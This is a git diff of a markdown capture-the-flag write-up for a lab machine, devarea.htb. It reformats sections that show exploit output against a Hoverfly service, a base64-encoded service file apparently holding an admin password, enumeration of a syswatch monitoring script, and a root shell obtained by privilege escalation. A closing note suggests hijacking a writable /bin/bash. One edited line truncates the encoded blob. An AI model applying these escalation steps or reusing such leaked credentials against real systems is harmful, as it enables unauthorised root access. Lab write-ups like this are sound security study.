@@ -118,8 +118,8 @@ A hoverfly is running on this port. try to view the info of it.
 ```
 [!] Exploit failed or no readable content
 [*] Dumping raw response:
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==. Department: IT. Content: test</return></ns2:submitReportResponse></soap:Body></soap:Envelope>                                                                                     ```                       
-
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from W1VuaXRdCkRpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==. Department: IT. Content: test</return></ns2:submitReportResponse></soap:Body></soap:Envelope>                     
+```
 decode it base64 -d
 ```
 [Unit]
@@ -196,9 +196,9 @@ Commands:
   --help|-h|help      Show this help
 ```
 
-syswatch-v1.zip under user folder.
-
-$ cat syswatch.sh
+syswatch-v1.zip under user folder, unzip it, and check the script.
+`$ cat syswatch.sh`
+```
 #!/bin/bash
 set -euo pipefail
 
@@ -206,9 +206,9 @@ CONFIG_FILE="/opt/syswatch/config/syswatch.conf"
 SYSWATCH_USER="syswatch"
 PLUGIN_DIR="/opt/syswatch/plugins"
 LOG_DIR="/opt/syswatch/logs"
-
-
-$ cat syswatch.conf
+```
+`$ cat syswatch.conf`
+```
 # SysWatch configuration
 export EMAIL_ADMIN="admin@devarea.htb"
 
@@ -229,7 +229,7 @@ export SERVICE_LOG="$LOG_DIR/service.log"
 
 export PLUGIN_DIR="/opt/syswatch/plugins"
 export SYSWATCH_USER="syswatch"
-
+```
 `cat /etc/systemd/system/syswatch-monitor.service`
 ```
 [Unit]
@@ -295,3 +295,6 @@ id
 uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root) groups=0(root),1001(dev_ryan)
 ```
 
+#### lesson learned
+- from jar file Enum info.
+- /bin/bash jihack if it is waritable
